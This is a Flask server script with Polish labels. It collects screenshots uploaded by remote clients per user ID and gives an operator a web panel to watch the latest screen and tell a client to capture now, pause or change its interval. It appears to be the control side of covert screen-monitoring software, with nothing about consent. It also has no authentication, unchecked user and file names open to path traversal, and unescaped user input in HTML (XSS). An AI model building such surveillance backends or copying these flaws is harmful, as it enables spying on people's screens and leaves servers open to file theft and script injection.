from flask import Flask, request, send_file, jsonify, render_template_string, redirect, url_for
import os
import datetime
import json
import pytz

app = Flask(__name__)
UPLOAD_FOLDER = "screens"
COMMAND_FOLDER = "commands"

os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(COMMAND_FOLDER, exist_ok=True)

POLAND = pytz.timezone("Europe/Warsaw")

@app.route("/")
def index():
    users = sorted(os.listdir(UPLOAD_FOLDER))
    users = [u for u in users if os.path.isdir(os.path.join(UPLOAD_FOLDER, u))]
    links = "".join([
        f'<li><a href="/view?user={u}">{u}</a> | '
        f'<a href="/screens_list?user={u}">Screeny</a></li>'
        for u in users
    ])
    return f"<h1>Dostępni użytkownicy</h1><ul>{links}</ul>"

@app.route("/screens/<user>/<filename>")
def get_screen(user, filename):
    path = os.path.join(UPLOAD_FOLDER, user, filename)
    if not os.path.exists(path):
        return "Nie znaleziono screena", 404
    return send_file(path, mimetype='image/png')

@app.route("/screens_list")
def screens_list():
    user = request.args.get("user")
    folder = os.path.join(UPLOAD_FOLDER, user)
    if not os.path.exists(folder):
        return "Brak screenów dla tego użytkownika", 404

    files = sorted(os.listdir(folder))
    content = f"<h1>Screeny: {user}</h1><ul>"
    for f in files:
        ts = f.replace("screenshot_", "").replace(".png", "").replace("_", " ")
        link = f"/screens/{user}/{f}"
        content += f'<li><a href="{link}" target="_blank">{ts}</a></li>'
    content += "</ul>"
    return content

@app.route("/view")
def view():
    user = request.args.get("user")
    if not user:
        return redirect(url_for("index"))
    return render_template_string('''
        <html>
        <head>
            <title>Zdalny Podgląd - {{ user }}</title>
            <style>
                body { background: #111; color: white; text-align: center; font-family: sans-serif; }
                img { max-width: 90%; border: 2px solid white; margin: 10px auto; display: block; }
                .panel { margin-top: 20px; }
                button { margin: 5px; padding: 10px 20px; font-size: 16px; cursor: pointer; }
                .status-box { margin-top: 20px; padding: 10px; background: #222; border: 1px solid #555; display: inline-block; }
            </style>
            <script>
                const user = "{{ user }}";
                async function sendCommand(action) {
                    await fetch("/command?user=" + user, {
                        method: "POST",
                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                        body: "action=" + action
                    });
                    updateStatus();
                }

                async function updateStatus() {
                    const res = await fetch("/command?user=" + user);
                    const data = await res.json();
                    document.getElementById("status").innerText = `Status: ${data.paused ? 'Zatrzymany' : 'Aktywny'} | Interwał: ${data.interval}s`;
                }

                setInterval(updateStatus, 3000);
                window.onload = updateStatus;
            </script>
        </head>
        <body>
            <h1>📸 Podgląd Ekranu: {{ user }}</h1>
            <img src="/latest?user={{ user }}" />

            <div class="panel">
                <button onclick="sendCommand('one_shot')">Zrób screena teraz</button>
                <button onclick="sendCommand('pause')">Pauza</button>
                <button onclick="sendCommand('resume')">Start</button>
                <button onclick="sendCommand('faster')">Szybciej</button>
                <button onclick="sendCommand('slower')">Wolniej</button>
            </div>

            <div class="status-box" id="status">
                Status: ładowanie...
            </div>
        </body>
        </html>
    ''', user=user)

@app.route("/latest")
def latest():
    user = request.args.get("user")
    user_folder = os.path.join(UPLOAD_FOLDER, user)
    if not os.path.exists(user_folder):
        return "Nie znaleziono użytkownika.", 404
    files = sorted(os.listdir(user_folder))
    if not files:
        return "Brak screenów.", 404
    return send_file(os.path.join(user_folder, files[-1]), mimetype='image/png')

@app.route("/upload", methods=['POST'])
def upload():
    user = request.form.get("user")
    if not user:
        return "Brak ID użytkownika", 400
    user_folder = os.path.join(UPLOAD_FOLDER, user)
    os.makedirs(user_folder, exist_ok=True)

    file = request.files['screenshot']
    now = datetime.datetime.now(POLAND).strftime("%Y-%m-%d_%H-%M-%S")
    filename = f"screenshot_{now}.png"
    filepath = os.path.join(user_folder, filename)
    file.save(filepath)
    return "OK"

@app.route("/command", methods=['GET', 'POST'])
def command():
    user = request.args.get("user")
    if not user:
        return "Brak ID użytkownika", 400
    command_path = os.path.join(COMMAND_FOLDER, f"{user}.json")

    if request.method == 'POST':
        action = request.form.get("action")
        data = {}
        if os.path.exists(command_path):
            with open(command_path, "r") as f:
                data = json.load(f)

        if action == "pause":
            data["paused"] = True
        elif action == "resume":
            data["paused"] = False
        elif action == "faster":
            data["interval"] = max(1, data.get("interval", 5) - 1)
        elif action == "slower":
            data["interval"] = data.get("interval", 5) + 1
        elif action == "one_shot":
            data["one_shot"] = True
        elif action == "clear_one_shot":
            data.pop("one_shot", None)

        with open(command_path, "w") as f:
            json.dump(data, f)

        return "OK"
    else:
        if not os.path.exists(command_path):
            return jsonify({"paused": False, "interval": 5})
        with open(command_path, "r") as f:
            return jsonify(json.load(f))
